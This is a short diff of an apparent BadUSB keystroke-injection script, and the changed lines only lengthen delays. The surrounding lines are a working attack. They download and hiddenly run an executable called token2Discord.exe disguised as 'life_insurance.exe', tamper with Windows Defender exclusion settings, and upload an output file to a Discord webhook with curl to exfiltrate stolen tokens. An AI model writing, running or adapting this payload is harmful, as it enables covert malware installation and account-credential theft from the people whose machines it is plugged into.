@@ -13,10 +13,10 @@ ENTER
 DELAY 500
 STRING $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden; Remove-Item -Path $file
 ENTER
-DELAY 6000
+DELAY 10000
 STRING Remove-MpPreference -ExclusionPath "C:\temp"
 ENTER
-DELAY 500
+DELAY 3500
 STRING curl.exe -F "file1=@output.txt" $webhook
 ENTER
 DELAY 500
